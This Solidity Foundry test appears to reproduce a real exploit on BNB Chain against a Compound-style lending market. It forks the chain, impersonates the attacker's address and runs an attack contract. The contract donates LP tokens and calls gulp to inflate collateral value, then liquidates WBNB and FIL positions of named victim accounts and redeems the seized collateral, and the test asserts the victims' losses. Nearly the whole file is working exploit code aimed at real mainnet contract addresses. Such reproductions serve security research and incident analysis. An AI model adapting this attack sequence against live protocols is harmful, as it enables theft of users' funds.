
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 34805971;
    uint256 constant TX_TIMESTAMP = 1703938731;
    uint256 constant TX_BLOCK_NUMBER = 34805972;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installAttackCode();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _installAttackCode() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.cCLP_BTCB_BUSD, "cCLP_BTCB_BUSD", 2);
        economicOracles.push(
            EconomicOracle({
                holder: Addresses.A_28B57A_CC61,
                asset: Addresses.cCLP_BTCB_BUSD,
                symbol: "cCLP_BTCB_BUSD",
                oracleKind: "victim_loss",
                expectPositive: false,
                expectedDeltaRaw: 622303,
                balancerInternalBalance: false
            })
        );
        economicOracles.push(
            EconomicOracle({
                holder: Addresses.MasterChef,
                asset: Addresses.Cake_LP,
                symbol: "Cake-LP",
                oracleKind: "victim_loss",
                expectPositive: false,
                expectedDeltaRaw: 1000000623,
                balancerInternalBalance: false
            })
        );
        economicOracles.push(
            EconomicOracle({
                holder: Addresses.A_E68541_2D82,
                asset: Addresses.cCLP_BTCB_BUSD,
                symbol: "cCLP_BTCB_BUSD",
                oracleKind: "victim_loss",
                expectPositive: false,
                expectedDeltaRaw: 25571355,
                balancerInternalBalance: false
            })
        );
    }
}

contract OurAttack {
    function attack() external payable {
        _executeLiquidations();
    }

    function _executeLiquidations() internal {
        _approveMarkets();
        _refreshMarkets();
        _donateLpAndSync();
        _liquidateWbnbDebt();
        _liquidateFilDebt();
        _redeemCollateral();
    }

    function _approveMarkets() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.cWBNB, type(uint256).max);
        IERC20Like(Addresses.FIL).approve(Addresses.cFIL, type(uint256).max);
    }

    function _refreshMarkets() internal {
        IcCLP_BTCB_BUSD(Addresses.cCLP_BTCB_BUSD).accrueInterest();
        IcWBNB(Addresses.cWBNB).accrueInterest();
        IcFIL(Addresses.cFIL).accrueInterest();
    }

    function _donateLpAndSync() internal {
        IERC20Like(Addresses.Cake_LP).transfer(Addresses.cCLP_BTCB_BUSD, 53410306284612);
        IcCLP_BTCB_BUSD(Addresses.cCLP_BTCB_BUSD).gulp();
    }

    function _liquidateWbnbDebt() internal {
        IChannelsComptroller(Addresses.A_FC5183_FC8C)
            .liquidateCalculateSeizeTokens(Addresses.cWBNB, Addresses.cCLP_BTCB_BUSD, 1329290662);
        IcWBNB(Addresses.cWBNB)
            .liquidateBorrow(Addresses.A_E68541_2D82, 1370983453, Addresses.cCLP_BTCB_BUSD);
    }

    function _liquidateFilDebt() internal {
        IChannelsComptroller(Addresses.A_FC5183_FC8C)
            .liquidateCalculateSeizeTokens(Addresses.cFIL, Addresses.cCLP_BTCB_BUSD, 1805588284);
        IcFIL(Addresses.cFIL)
            .liquidateBorrow(Addresses.A_28B57A_CC61, 1818928391, Addresses.cCLP_BTCB_BUSD);
    }

    function _redeemCollateral() internal {
        uint256 collateralBalance = IERC20Like(Addresses.cCLP_BTCB_BUSD).balanceOf(address(this));
        uint256 collateralSupply = IERC20Like(Addresses.cCLP_BTCB_BUSD).totalSupply();
        uint256 preRedeemBalance = IERC20Like(Addresses.cCLP_BTCB_BUSD).balanceOf(address(this));
        collateralBalance;
        collateralSupply;
        preRedeemBalance;

        uint256 redeemShares = 26193656;
        IcCLP_BTCB_BUSD(Addresses.cCLP_BTCB_BUSD).redeem(redeemShares);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x74f353cd) {
            _executeLiquidations();
            return;
        }
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_contract = 0x07e536F23a197F6FB76F42aD01ac2Bcdc3BF738E;
    address internal constant FIL = 0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153;
    address internal constant Cake = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address internal constant A_11797D_93D7 = 0x11797D61fD4BfF9728113601782D4444503093d7;
    address internal constant attacker_eoa = 0x20395D8e8a11CFD2541b942aFdb810b7dcc64681;
    address internal constant ETH = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    address internal constant A_28B57A_CC61 = 0x28B57affFC9017B817972d27E3332f81A846cc61;
    address internal constant A_31B595_D3EF = 0x31B5954CA1b1ddfEC3215BC37f0f858a2035D3Ef;
    address internal constant DOT = 0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402;
    address internal constant MasterChef = 0x73feaa1eE314F8c655E354234017bE2193C9E24E;
    address internal constant cWBNB = 0x860DF3e99f6223D695aB51b2FB9eaa92Fa903E8D;
    address internal constant cCLP_BTCB_BUSD = 0x93790C641D029D1cBd779D87b88f67704B6A8F4C;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_BEBA90_1C8F = 0xBEBA905188a00b8C2FA2789E2550A3A3144b1C8f;
    address internal constant A_C04092_6127 = 0xC04092344AF93d1F3ad8E31Fd250E1C6F7e16127;
    address internal constant A_CA7975_6D4B = 0xca797539f004C0F9c206678338f820AC38466D4b;
    address internal constant GnosisSafeProxy = 0xcEba60280fb0ecd9A5A26A1552B90944770a4a0e;
    address internal constant A_E68541_2D82 = 0xe685417BfDdA1c4cA01A430Faf1a20668f672D82;
    address internal constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address internal constant Cake_LP = 0xF45cd219aEF8618A92BAa7aD848364a158a24F33;
    address internal constant cFIL = 0xf77ef89255Fb387C6ebA1557c615A8B31A518aa2;
    address internal constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;
    address internal constant A_FC5183_FC8C = 0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IChannelsComptroller {
    function liquidateCalculateSeizeTokens(address, address, uint256) external view;
}

interface IcCLP_BTCB_BUSD {
    function accrueInterest() external returns (uint256);
    function gulp() external;
    function redeem(uint256) external returns (uint256);
}

interface IcFIL {
    function accrueInterest() external returns (uint256);
    function liquidateBorrow(address, uint256, address) external returns (uint256);
}

interface IcWBNB {
    function accrueInterest() external returns (uint256);
    function liquidateBorrow(address, uint256, address) external returns (uint256);
}
